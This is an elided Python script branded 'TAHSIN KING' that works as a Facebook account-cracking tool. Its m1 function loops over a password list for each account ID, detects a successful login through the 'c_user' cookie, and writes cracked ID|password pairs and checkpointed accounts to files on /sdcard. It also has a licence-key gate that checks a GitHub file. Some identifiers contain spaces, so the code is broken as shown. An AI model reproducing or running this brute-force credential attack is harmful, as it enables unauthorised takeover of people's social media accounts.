#TAHSIN KING - _ - FILE _-_ON_-_FIRE !¡●●
#TAHSIN KING ✌️
from os import path
...
def TAHSIN KINGALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/emtcybertahsin/BD/blob/main/APPROVAL.txt').text
...
|__  $$__//$$__  $$| $$  | $$ /$$__  $$|_  $$_/| $$$ | $$      
 ...
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 Author    : TAHSIN KING
 Github    : emtcybertahsin
 Facebook  : TAHSIN KING
 Tool Name : TAHSIN KING
 Tool Type : \033[1;31m FREE TOOLS\033[1;37m
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
  ...
  #os.system(f'xdg-open https://www.facebook.com/mdakash.ahamed.14')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/emtcybertahsin/BD/blob/main/APPROVAL.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801944417541?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Github    : emtcybertahsin
 Facebook  : TAHSIN KING
 Tool Name : \033[1;36mFIRE COMMAND \033[1;37m
 Tool Type : \033[1;31m FREE TOOLS\033[1;37m
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [TAHSIN KING] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        TAHSIN KING=session.cookies.get_dict().keys()
                        if "c_user" in TAHSIN KING:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [TAHSIN KING\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/TAHSIN KING•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in TAHSIN KING:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [TAHSIN KING•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/TAHSIN KING•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in TAHSIN KING:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/TAHSIN KING•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in TAHSIN KING:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in TAHSIN KING:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/TAHSIN KING•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in TAHSIN KING:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in TAHSIN KING:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/TAHSIN KING•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in TAHSIN KING:
                                if 'y' in pcp:
